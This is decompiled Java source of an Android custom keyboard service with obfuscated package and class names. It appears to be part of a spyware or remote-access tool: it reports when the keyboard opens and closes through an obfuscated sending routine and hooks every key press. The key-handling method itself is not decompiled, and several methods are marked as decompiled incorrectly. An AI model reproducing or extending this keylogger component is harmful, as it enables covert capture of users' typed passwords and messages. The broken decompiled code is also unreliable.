package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3;

import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.media.AudioManager;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0045d;
import java.util.Locale;
import org.chromium.net.C0116R;
/* loaded from: classes.dex */
public class Sdccwtcrzruwpquzczlrtkgkngsvfajkdocndavioslxkoezffl6IME extends InputMethodService implements KeyboardView.OnKeyboardActionListener {

    /* renamed from: f */
    public static boolean f248f;

    /* renamed from: g */
    public static boolean f249g;

    /* renamed from: a */
    private KeyboardView f250a;

    /* renamed from: b */
    private Keyboard f251b;

    /* renamed from: c */
    int f252c = 0;

    /* renamed from: d */
    private boolean f253d = false;

    /* renamed from: e */
    String f254e = "";

    /* renamed from: a */
    private void m186a(int i) {
        try {
            ((AudioManager) getSystemService("audio")).playSoundEffect(i != -5 ? (i == -4 || i == 10) ? 8 : i != 32 ? 5 : 6 : 7);
        } catch (Exception unused) {
        }
    }

    /* renamed from: b */
    public static String m185b(String str) {
        try {
            return m184c(str, 1);
        } catch (Exception unused) {
            return str;
        }
    }

    /* renamed from: c */
    public static String m184c(String str, int i) {
        return str.substring(0, str.length() - i);
    }

    @Override // android.inputmethodservice.InputMethodService
    public View onCreateInputView() {
        int i = 1;
        f248f = true;
        String language = Locale.getDefault().getLanguage();
        if (f249g) {
            oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.m117j(C0045d.f207v, "LG:KeyBoard: [Open]".getBytes());
        }
        this.f254e = "";
        this.f250a = (KeyboardView) getLayoutInflater().inflate(C0116R.layout.keyboard, (ViewGroup) null);
        char c = 65535;
        int hashCode = language.hashCode();
        if (hashCode != 3121) {
            if (hashCode == 3179 && language.equals("cn")) {
                c = 1;
            }
        } else if (language.equals("ar")) {
            c = 0;
        }
        if (c == 0) {
            this.f251b = new Keyboard(this, C0116R.xml.qwerty_a);
        } else if (c != 1) {
            this.f251b = new Keyboard(this, C0116R.xml.qwerty_e);
            this.f252c = 0;
            this.f250a.setKeyboard(this.f251b);
            this.f250a.setOnKeyboardActionListener(this);
            return this.f250a;
        } else {
            this.f251b = new Keyboard(this, C0116R.xml.qwerty_c);
            i = 2;
        }
        this.f252c = i;
        this.f250a.setKeyboard(this.f251b);
        this.f250a.setOnKeyboardActionListener(this);
        return this.f250a;
    }

    @Override // android.inputmethodservice.InputMethodService, android.inputmethodservice.AbstractInputMethodService, android.app.Service
    public void onDestroy() {
        super.onDestroy();
        this.f254e = "";
        if (f249g) {
            oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.m117j(C0045d.f207v, "LG:KeyBoard: [Closed]".getBytes());
        }
        this.f253d = false;
    }

    /* JADX WARN: Code restructure failed: missing block: B:11:0x0014, code lost:
        if (r5 != 3) goto L22;
     */
    /* JADX WARN: Removed duplicated region for block: B:18:0x0031 A[Catch: Exception -> 0x0043, TryCatch #0 {Exception -> 0x0043, blocks: (B:3:0x0003, B:15:0x0026, B:13:0x001a, B:16:0x002d, B:18:0x0031, B:19:0x003c, B:14:0x001e, B:12:0x0016), top: B:22:0x0003 }] */
    @Override // android.inputmethodservice.InputMethodService
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public void onFinishInputView(boolean r5) {
        /*
            r4 = this;
            super.onFinishInputView(r5)
            int r5 = r4.f252c     // Catch: java.lang.Exception -> L43
            java.lang.String r0 = "EN"
            java.lang.String r1 = "LK"
            if (r5 == 0) goto L16
            r2 = 1
            java.lang.String r3 = "CN"
            if (r5 == r2) goto L1e
            r2 = 2
            if (r5 == r2) goto L26
            r2 = 3
            if (r5 == r2) goto L1e
        L16:
            android.content.Context r5 = r4.getApplicationContext()     // Catch: java.lang.Exception -> L43
        L1a:
            com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.C0059e.m179d(r5, r1, r0)     // Catch: java.lang.Exception -> L43
            goto L2d
        L1e:
            android.content.Context r5 = r4.getApplicationContext()     // Catch: java.lang.Exception -> L43
            com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.C0059e.m179d(r5, r1, r3)     // Catch: java.lang.Exception -> L43
            goto L2d
        L26:
            android.content.Context r5 = r4.getApplicationContext()     // Catch: java.lang.Exception -> L43
            java.lang.String r0 = "AR"
            goto L1a
        L2d:
            boolean r5 = com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.Sdccwtcrzruwpquzczlrtkgkngsvfajkdocndavioslxkoezffl6IME.f249g     // Catch: java.lang.Exception -> L43
            if (r5 == 0) goto L3c
            java.lang.String r5 = com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0045d.f207v     // Catch: java.lang.Exception -> L43
            java.lang.String r0 = "LG:KeyBoard: [Closed]"
            byte[] r0 = r0.getBytes()     // Catch: java.lang.Exception -> L43
            com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.m117j(r5, r0)     // Catch: java.lang.Exception -> L43
        L3c:
            r5 = 0
            r4.f253d = r5     // Catch: java.lang.Exception -> L43
            java.lang.String r5 = ""
            r4.f254e = r5     // Catch: java.lang.Exception -> L43
        L43:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.Sdccwtcrzruwpquzczlrtkgkngsvfajkdocndavioslxkoezffl6IME.onFinishInputView(boolean):void");
    }

    /* JADX WARN: Code restructure failed: missing block: B:72:0x01e3, code lost:
        if (r1 != 3) goto L87;
     */
    /* JADX WARN: Removed duplicated region for block: B:100:0x024c A[Catch: Exception -> 0x025c, TryCatch #0 {Exception -> 0x025c, blocks: (B:3:0x0004, B:12:0x0029, B:14:0x002f, B:16:0x0033, B:17:0x0037, B:19:0x004e, B:21:0x0052, B:23:0x005f, B:32:0x00a0, B:24:0x006b, B:26:0x006f, B:28:0x007c, B:29:0x0088, B:31:0x0095, B:34:0x00a8, B:36:0x00b3, B:37:0x00d2, B:39:0x00d6, B:41:0x00eb, B:43:0x00f7, B:45:0x00fb, B:47:0x010d, B:49:0x0119, B:52:0x011e, B:54:0x012e, B:55:0x013b, B:57:0x0149, B:58:0x0154, B:59:0x015a, B:61:0x0169, B:62:0x0193, B:65:0x01a0, B:67:0x01b3, B:68:0x01db, B:75:0x01f5, B:76:0x01fc, B:74:0x01ed, B:73:0x01e5, B:77:0x01ff, B:101:0x0255, B:98:0x0238, B:99:0x0242, B:100:0x024c, B:84:0x0218, B:87:0x0220, B:90:0x0228), top: B:104:0x0004 }] */
    /* JADX WARN: Removed duplicated region for block: B:95:0x0233  */
    @Override // android.inputmethodservice.KeyboardView.OnKeyboardActionListener
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public void onKey(int r17, int[] r18) {
        /*
            Method dump skipped, instructions count: 605
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.Sdccwtcrzruwpquzczlrtkgkngsvfajkdocndavioslxkoezffl6IME.onKey(int, int[]):void");
    }

    @Override // android.inputmethodservice.KeyboardView.OnKeyboardActionListener
    public void onPress(int i) {
    }

    @Override // android.inputmethodservice.KeyboardView.OnKeyboardActionListener
    public void onRelease(int i) {
    }

    /* JADX WARN: Code restructure failed: missing block: B:20:0x0041, code lost:
        if (r8 == 1) goto L22;
     */
    /* JADX WARN: Code restructure failed: missing block: B:21:0x0043, code lost:
        if (r8 == 2) goto L21;
     */
    /* JADX WARN: Code restructure failed: missing block: B:23:0x0046, code lost:
        r6.f251b = new android.inputmethodservice.Keyboard(r6, org.chromium.net.C0116R.xml.qwerty_c);
        r6.f252c = 2;
     */
    /* JADX WARN: Code restructure failed: missing block: B:24:0x0053, code lost:
        r6.f251b = new android.inputmethodservice.Keyboard(r6, org.chromium.net.C0116R.xml.qwerty_a);
        r6.f252c = 1;
     */
    @Override // android.inputmethodservice.InputMethodService
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public void onStartInputView(android.view.inputmethod.EditorInfo r7, boolean r8) {
        /*
            r6 = this;
            java.lang.String r0 = "EN"
            super.onStartInputView(r7, r8)
            android.content.Context r7 = r6.getApplicationContext()     // Catch: java.lang.Exception -> L81
            java.lang.String r8 = "LK"
            java.lang.String r7 = com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.C0059e.m177f(r7, r8, r0)     // Catch: java.lang.Exception -> L81
            r8 = -1
            int r1 = r7.hashCode()     // Catch: java.lang.Exception -> L81
            r2 = 2097(0x831, float:2.939E-42)
            r3 = 0
            r4 = 2
            r5 = 1
            if (r1 == r2) goto L36
            r2 = 2155(0x86b, float:3.02E-42)
            if (r1 == r2) goto L2c
            r2 = 2217(0x8a9, float:3.107E-42)
            if (r1 == r2) goto L24
            goto L3f
        L24:
            boolean r7 = r7.equals(r0)     // Catch: java.lang.Exception -> L81
            if (r7 == 0) goto L3f
            r8 = 0
            goto L3f
        L2c:
            java.lang.String r0 = "CN"
            boolean r7 = r7.equals(r0)     // Catch: java.lang.Exception -> L81
            if (r7 == 0) goto L3f
            r8 = 2
            goto L3f
        L36:
            java.lang.String r0 = "AR"
            boolean r7 = r7.equals(r0)     // Catch: java.lang.Exception -> L81
            if (r7 == 0) goto L3f
            r8 = 1
        L3f:
            if (r8 == 0) goto L60
            if (r8 == r5) goto L53
            if (r8 == r4) goto L46
            goto L6c
        L46:
            android.inputmethodservice.Keyboard r7 = new android.inputmethodservice.Keyboard     // Catch: java.lang.Exception -> L81
            r8 = 2131492871(0x7f0c0007, float:1.8609206E38)
            r7.<init>(r6, r8)     // Catch: java.lang.Exception -> L81
            r6.f251b = r7     // Catch: java.lang.Exception -> L81
            r6.f252c = r4     // Catch: java.lang.Exception -> L81
            goto L6c
        L53:
            android.inputmethodservice.Keyboard r7 = new android.inputmethodservice.Keyboard     // Catch: java.lang.Exception -> L81
            r8 = 2131492870(0x7f0c0006, float:1.8609204E38)
            r7.<init>(r6, r8)     // Catch: java.lang.Exception -> L81
            r6.f251b = r7     // Catch: java.lang.Exception -> L81
            r6.f252c = r5     // Catch: java.lang.Exception -> L81
            goto L6c
        L60:
            android.inputmethodservice.Keyboard r7 = new android.inputmethodservice.Keyboard     // Catch: java.lang.Exception -> L81
            r8 = 2131492873(0x7f0c0009, float:1.860921E38)
            r7.<init>(r6, r8)     // Catch: java.lang.Exception -> L81
            r6.f251b = r7     // Catch: java.lang.Exception -> L81
            r6.f252c = r3     // Catch: java.lang.Exception -> L81
        L6c:
            boolean r7 = com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.Sdccwtcrzruwpquzczlrtkgkngsvfajkdocndavioslxkoezffl6IME.f249g     // Catch: java.lang.Exception -> L81
            if (r7 == 0) goto L7b
            java.lang.String r7 = com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0045d.f207v     // Catch: java.lang.Exception -> L81
            java.lang.String r8 = "LG:KeyBoard: [Open]"
            byte[] r8 = r8.getBytes()     // Catch: java.lang.Exception -> L81
            com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.m117j(r7, r8)     // Catch: java.lang.Exception -> L81
        L7b:
            r6.f253d = r3     // Catch: java.lang.Exception -> L81
            java.lang.String r7 = ""
            r6.f254e = r7     // Catch: java.lang.Exception -> L81
        L81:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.Sdccwtcrzruwpquzczlrtkgkngsvfajkdocndavioslxkoezffl6IME.onStartInputView(android.view.inputmethod.EditorInfo, boolean):void");
    }

    @Override // android.inputmethodservice.KeyboardView.OnKeyboardActionListener
    public void onText(CharSequence charSequence) {
        Log.e("onText", String.valueOf(charSequence));
    }

    @Override // android.inputmethodservice.KeyboardView.OnKeyboardActionListener
    public void swipeDown() {
    }

    @Override // android.inputmethodservice.KeyboardView.OnKeyboardActionListener
    public void swipeLeft() {
    }

    @Override // android.inputmethodservice.KeyboardView.OnKeyboardActionListener
    public void swipeRight() {
    }

    @Override // android.inputmethodservice.KeyboardView.OnKeyboardActionListener
    public void swipeUp() {
    }
}
